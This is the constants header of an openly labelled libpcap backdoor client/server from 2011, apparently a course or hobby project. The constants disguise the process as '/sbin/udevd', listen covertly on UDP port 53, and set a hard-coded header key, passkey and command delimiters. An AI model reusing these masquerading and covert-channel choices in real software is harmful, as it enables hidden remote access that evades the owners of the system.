#ifndef DEFS_H
#define DEFS_H

/*
SOURCE FILE: defs.h

PROGRAM: Backdoor - A simple two in one backdoor client/server using libpcap

DATE: October 23, 2011

REVISIONS:
	1.0 - October 23

DESIGNERS:
	Santana Mach and Steve Stanisic

PROGRAMMERS:
	Santana Mach and Steve Stanisic

NOTES: This file holds the constants used throughout the program.
*/

#include <sys/types.h>

// Sized types
#define uint8   u_int8_t
#define uint16  u_int16_t
#define uint32  u_int32_t
#define uint64  u_int64_t

#define TRUE    1
#define FALSE   0

#define MASK 	"/sbin/udevd"

#define MAX_LEN 256

#define DEF_PRT 53
#define DEF_ADR "127.0.0.1"
#define DEF_FLT "udp port 53"

#define HDR_KEY "(P^.^)=P"
#define PASSKEY "tessera"

#define CMD_STR "start["
#define CMD_END "]end"

#endif
